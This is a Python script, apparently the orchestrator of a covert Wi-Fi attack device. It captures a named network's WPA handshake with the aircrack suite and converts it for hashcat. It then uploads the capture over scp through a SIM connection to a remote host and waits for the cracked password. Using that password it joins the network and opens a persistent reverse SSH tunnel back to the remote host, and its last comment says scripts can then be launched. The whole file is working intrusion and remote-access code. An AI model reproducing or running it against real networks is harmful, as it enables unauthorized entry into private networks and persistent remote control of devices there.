import subprocess
import signal
import json
import time
import sys
import os

from common_functions import get_config_field, write_log

from components.airmon import Airmon
from components.airodump import Airodump
from components.aircrack import Aircrack

from send_handshake_methods import send_through_scp


def check_config_file():
    try:
        with open('src/configuration.json') as f:
            configuration_fields = json.load(f)
            mandatory_fields = ['interface', 'send_handshake', 'reverse_ssh_tunnel']
            abort_program = False
            for field in mandatory_fields:
                if not field in configuration_fields:
                    write_log(f'[!] Configuration file "configuration.json" is uncomplete. Field "{field}" not found')
                    abort_program = True
            if abort_program:
                sys.exit(1)
            
    except FileNotFoundError:
        write_log(f'[!] Configuration file "configuration.json" does not exists')
        sys.exit(1)
        
        
def check_dependencies():
    dependencies = ['hcxpcapngtool', 'minicom', 'dhclient --help', 'wpa_passphrase', 'wpa_supplicant --help', 'screen --help']
    for command in dependencies:
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        if output.returncode != 0 and output.returncode != 1:
            write_log(f'[!] Command "{command}" not installed')
            sys.exit(1)
            
            
def pcap_to_hashcat_format(file_name: str):
    command = f'hcxpcapngtool -o src/files/{file_name}.hc22000 src/files/{file_name}-01.cap'
    run = subprocess.run(command, shell=True, capture_output=True, text=True)
    if run.stderr:
        write_log(f'[!] Failed in command "{command}"')
        sys.exit(1)
    else:
        write_log(f'[+] .cap file exported correctly to hashcat format')
        
        
def open_reverse_tunnel(persistent = False):
    reverse_tunnel_information: dict = get_config_field('reverse_ssh_tunnel')
    
    remote_user = reverse_tunnel_information.get('user')
    remote_host = reverse_tunnel_information.get('host')
    key_path = reverse_tunnel_information.get('key_path')
    if not remote_user or not remote_host or not key_path:
        write_log(f'[!] You must specify fields "user", "host" and "key_path" to open a reverse tunnel')
        sys.exit(1)
    
    remote_port = 9090
    if reverse_tunnel_information.get('port'):
        remote_port = reverse_tunnel_information.get('port')

    if persistent:
        command = f'screen -dmS reverse_ssh_tunnel ssh -i {key_path} -R {remote_port}:localhost:22 {remote_user}@{remote_host} -N'
        subprocess.run(command, shell=True, text=True)
        return None
    else:
        command = ["ssh", "-i", key_path, "-R", f"{remote_port}:localhost:22", f"{remote_user}@{remote_host}", "-N"]
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return process


def kill_process(process):
    process.terminate()
    try:
        process.wait(10)
    except Exception:
        process.kill()

        
def enable_internet_through_sim():
    command = 'service NetworkManager restart'
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    if output.stderr:
        write_log(f'[!] Error executing command "{command}"')
        sys.exit(1)
        
    try:
        file_path = os.path.join('minicom', 'init.txt')
        with open(file_path) as _:
            command = f'minicom -D /dev/ttyUSB2 -S {file_path}'
            subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            time.sleep(30)
            
            command = 'dhclient usb0'
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            if output.stderr:
                write_log(f'[!] Error executing command "{command}"')
                sys.exit(1)
            
    except FileNotFoundError:
        write_log(f'[!] Script to start internet through SIM card does not exists')
        sys.exit(1)


def send_captured_handshake(captured_handshake_file_name: str):
    # Transform .cap file to hashcat format with hcxpcappngtool
    pcap_to_hashcat_format(captured_handshake_file_name)
    
    # Once .hc22000 file has been stored, send
    method_to_send: dict = get_config_field("send_handshake")
    if 'scp' in method_to_send:
        scp_information = method_to_send.get('scp')
        send_through_scp(scp_information, captured_handshake_file_name)
        
        
def wait_for_cracked_password():
    cracked_password: str = None
    while not cracked_password:
        try:
            with open('src/files/cracked_password.txt') as f:
                cracked_password = f.read()
                    
        except FileNotFoundError:
            # time.sleep(120)  # wait for 2 minutes to check again in PROD
            time.sleep(30)
    
    return cracked_password


def connect_to_network(network_ssid: str, cracked_password: str):
    # Generate wpa config file
    command = f'wpa_passphrase {network_ssid} {cracked_password}'
    with open(f'/tmp/{network_ssid}.conf', 'w') as f:
        subprocess.run(command, shell=True, text=True, stdout=f)
        
    # Connect to wifi
    command = f'wpa_supplicant -B -i wlan0 -c /tmp/{network_ssid}.conf'
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    if output.stderr:
        write_log(f'[!] Error executing command "{command}"')
        sys.exit(1)
    
    time.sleep(30)

    # Getting an IP
    command = f'dhclient -r; dhclient wlan0'
    output = subprocess.run(command, shell=True, text=True)


if __name__ == '__main__':
    airmon: Airmon = Airmon()
    airodump: Airodump = Airodump()
    
    # Check if configuration file exists and it has every mandatory key
    check_config_file()
    
    # Check if every command it is installed
    check_dependencies()
    
    monitor_interface: str = airmon.start_monitor_mode()
    # monitor_interface: str = 'wlan0mon'

    # Capture all reachable networks
    networks_file_name = airodump.capture_available_networks(monitor_interface)
    
    # Capture 4 way handshake
    network_ssid = get_config_field('ssid')
    handshake_file_name = airodump.capture_handshake(monitor_interface, network_ssid, networks_file_name)
    
    # Stop monitor mode and enable internet through SIM
    airmon.stop_monitor_mode(monitor_interface)
    enable_internet_through_sim()
    
    # Send captured handshake
    send_captured_handshake(handshake_file_name)
            
    # Open reverse tunnel to receive cracked password
    process = open_reverse_tunnel()
    
    cracked_password = wait_for_cracked_password()
    if not cracked_password:
        write_log('[!] Something went wrong reading cracked password')
    
    kill_process(process)
    
    # Connect to cracked network
    connect_to_network(network_ssid, cracked_password)
    
    # Open reverse tunnel
    open_reverse_tunnel(persistent=True)
    
    '''
    Listo!! A partir de aqui a lanzar scripts
    '''